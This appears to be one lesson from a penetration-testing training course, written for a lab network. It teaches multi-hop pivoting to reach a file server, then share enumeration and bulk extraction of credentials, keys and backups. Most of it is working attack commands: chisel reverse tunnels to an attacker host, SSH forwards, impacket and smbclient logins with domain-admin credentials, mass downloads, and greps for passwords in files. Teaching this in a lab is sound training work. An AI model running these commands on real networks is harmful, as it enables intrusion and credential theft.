---
title: "Phase 5 — sable-store Access via Multi-Hop Pivot"
tags: [ghost-level, pivoting, nfs, smb, lateral-movement, file-server,
  multi-hop, module-11-ghost-level]
module: 11-GhostLevel
day: 719
prerequisites:
  - Day 718 — Phase 5: IoT Exploitation
  - Day 710 — Phase 2: Post-Web-Exploitation
related_topics:
  - Day 720 — Phase 5: Data Exfiltration
---

# Day 719 — Phase 5: sable-store Access via Multi-Hop Pivot

> "Multi-hop pivoting is just tunnelling, recursively. You have a shell
> on sable-web, a shell on sable-svc, a shell on sable-iot. Each one
> sees a different slice of the network. Your job is to stack them until
> you can see everything. The target is 10.0.1.50 — find the path that
> reaches it."
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | Shells: sable-web/sable-svc/sable-iot acquired

---

## Goals

Reach `sable-store` (10.0.1.50) through the existing pivot chain. Enumerate
file shares. Identify and extract sensitive data including AD credentials,
source code, and backup files that escalate the impact of the engagement.

**Target time:** 2–3 hours.

---

## 1 — Pivot Chain Analysis

```
CURRENT NETWORK VISIBILITY MAP

Attacker (10.0.2.10)
  └── sable-web (10.0.1.10)  ← SSH SOCKS / Chisel tunnel
        └── sable-svc (10.0.1.20)  ← shell obtained
        └── sable-dc  (10.0.1.30)  ← LDAP/SMB reached
        └── sable-iot (10.0.1.40)  ← shell obtained
        └── sable-store (10.0.1.50) ← NOT YET REACHED

Question: which host can directly reach sable-store?
  sable-web:   try → 10.0.1.50
  sable-svc:   try → 10.0.1.50
  sable-iot:   try → 10.0.1.50  (checked Day 718)
  sable-dc:    likely yes (domain member)
```

```bash
# ─── Test which hops can reach sable-store ───────────────────────────
# From the proxychains pivot (sable-web reach):
proxychains nmap -sn 10.0.1.50 -Pn 2>/dev/null && echo "Reachable via sable-web pivot"

# From sable-iot shell (if persistent):
ping -c 1 -W 2 10.0.1.50 2>/dev/null && echo "Reachable from sable-iot"

# From sable-web directly (via SSH command):
proxychains ssh -i /tmp/pivot_key root@10.0.1.10 \
    "ping -c 1 -W 2 10.0.1.50 && echo reachable"
```

---

## 2 — Extending the Pivot Chain

```bash
# ─── Option A: Direct reach via existing proxychains tunnel ──────────
proxychains nmap -p 21,22,80,139,445,873,2049,8080 10.0.1.50 \
    -Pn --open 2>/dev/null

# ─── Option B: Add sable-iot as a hop ─────────────────────────────────
# If sable-store is only reachable from sable-iot, relay through it.
# Upload chisel to sable-iot:
proxychains curl -sk http://10.0.1.40/cgi-bin/... # not ideal
# Better: use the shell you already have

# Start a second chisel hop on sable-iot:
# Attacker: ./chisel server -p 9999 --reverse
# sable-iot: ./chisel client 10.0.2.10:9999 R:1090:10.0.1.50:445

# Or: create SSH port forward through sable-iot
proxychains ssh -i /tmp/iot_key root@10.0.1.40 \
    -L 2049:10.0.1.50:2049 -L 445:10.0.1.50:445 \
    -f -N

# ─── Option C: Use sable-dc as pivot (already have DA creds) ──────────
# SMB relay or use impacket from proxychains
proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 \
    "\\\\10.0.1.50\\C$"
```

```
PIVOT EXTENSION

sable-store reachable via:
  Direct proxychains:       Y / N
  Via sable-iot pivot:      Y / N
  Via sable-dc (impacket):  Y / N

Method used to reach sable-store: __________________________________
Tunnel setup: ______________________________________________________
```

---

## 3 — sable-store Enumeration

```bash
# ─── Full port scan ───────────────────────────────────────────────────
proxychains nmap -sV -sC -p- 10.0.1.50 -Pn --min-rate=2000 \
    2>/dev/null | tee recon/sable-store/nmap_full.txt

# ─── SMB enumeration ──────────────────────────────────────────────────
proxychains crackmapexec smb 10.0.1.50 \
    -u "Administrator" -p "<da_password>" \
    --shares 2>/dev/null

proxychains smbclient -L //10.0.1.50 \
    -U "SABLE/Administrator%<da_password>" 2>/dev/null

# Anonymous SMB access?
proxychains smbclient -L //10.0.1.50 -N 2>/dev/null

# ─── NFS enumeration ──────────────────────────────────────────────────
proxychains showmount -e 10.0.1.50 2>/dev/null
# If NFS is exported and accessible:
proxychains nmap -sV --script=nfs-showmount -p 2049 10.0.1.50

# ─── FTP enumeration ──────────────────────────────────────────────────
proxychains ftp 10.0.1.50
# test: anonymous login
```

```
SABLE-STORE ENUMERATION

Open ports:
  22  (SSH):     ________________________________________________
  21  (FTP):     ________________________________________________
  445 (SMB):     ________________________________________________
  139 (NetBIOS): ________________________________________________
  2049 (NFS):    ________________________________________________
  873 (rsync):   ________________________________________________
  Other: _______________________________________________________

SMB shares:
  Share name       Access        Type
  _______________  ___________   ____
  _______________  ___________   ____
  _______________  ___________   ____

NFS exports: Y / N
  Exported path: _______________  Accessible: Y / N

Anonymous access: Y / N  (SMB null session or NFS no-auth)
```

---

## 4 — Data Exfiltration from sable-store

```bash
# ─── SMB share access ─────────────────────────────────────────────────
proxychains smbclient //10.0.1.50/<share_name> \
    -U "SABLE/Administrator%<password>" \
    -c "ls" 2>/dev/null

# Recursive listing:
proxychains smbclient //10.0.1.50/<share_name> \
    -U "SABLE/Administrator%<password>" \
    -c "recurse; ls" 2>/dev/null | head -50

# Download interesting files:
proxychains smbclient //10.0.1.50/Backups \
    -U "SABLE/Administrator%<password>" 2>/dev/null << 'EOF'
recurse
prompt off
mget *
EOF

# ─── NFS mount access ─────────────────────────────────────────────────
sudo mount -t nfs 10.0.1.50:/exports/data /mnt/sable-store 2>/dev/null
ls -la /mnt/sable-store/

# ─── Target file types ────────────────────────────────────────────────
# Priority 1: Credentials
find . \( -name "*.csv" -o -name "*.kdbx" -o -name "*.xlsx" \
    -o -name "passwords*" -o -name "creds*" \) 2>/dev/null | head -20

# Priority 2: Config/source files
find . \( -name "*.env" -o -name "*.config" -o -name "*.key" \
    -o -name "*.pem" -o -name "*.pfx" \) 2>/dev/null | head -20

# Priority 3: Backup archives
find . \( -name "*.bak" -o -name "*.zip" -o -name "*.tar*" \
    -o -name "backup*" \) 2>/dev/null | head -20

# Priority 4: Source code
find . -name "*.py" -o -name "*.js" -o -name "*.go" 2>/dev/null \
    | xargs grep -il "password\|secret\|api_key" 2>/dev/null | head -10
```

```bash
# ─── Database backup files ────────────────────────────────────────────
# .sql, .dump, .sqlite files often contain cleartext passwords
find . -name "*.sql" -o -name "*.dump" -o -name "*.sqlite" 2>/dev/null \
    | head -10

# Peek into SQL backup for credentials:
for f in $(find . -name "*.sql" 2>/dev/null | head -5); do
    echo "=== $f ==="
    grep -i "INSERT.*user\|password\|email" "$f" 2>/dev/null | head -10
done
```

```
SABLE-STORE DATA EXFILTRATION

Files/shares accessed: ___________________________________________

High-value files found:
  File 1: _________________ Contents: ___________________________
  File 2: _________________ Contents: ___________________________
  File 3: _________________ Contents: ___________________________

Credentials discovered:
  Account: ___________________  Password: ______________________
  Account: ___________________  Password: ______________________

Database backup found: Y / N
  Usernames extracted: ________________________________________
  Password hashes extracted: __________________________________
  Plaintext passwords: ________________________________________

Other sensitive data:
  Private keys: Y / N
  Source code with secrets: Y / N
  Backup archives: Y / N
  PII (names, emails, etc.): Y / N

Total data size staged: _________ MB
Evidence path: recon/sable-store/
```

---

## 5 — sable-store Finding Card

```
SABLE-STORE FINDING CARD

Finding 1: [Sensitive Data Exposure via Misconfigured Share]
  CWE: CWE-200 (Exposure of Sensitive Information)
  CVSS: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium)
        (higher if unauthenticated access was possible)

  Evidence: _____________________________________________________
  Impact: _______________________________________________________
  Fix: Require authentication; restrict shares to specific AD groups.

Finding 2: [if any additional vuln found]
  _______________________________________________________________
```

---

## Navigation

← Previous: [Day 718 — Phase 5: IoT Exploitation](DAY-0718-Phase5-IoT-Exploitation.md)
→ Next: [Day 720 — Phase 5: Data Exfiltration and Evidence Collection](DAY-0720-Phase5-Exfiltration-Evidence.md)
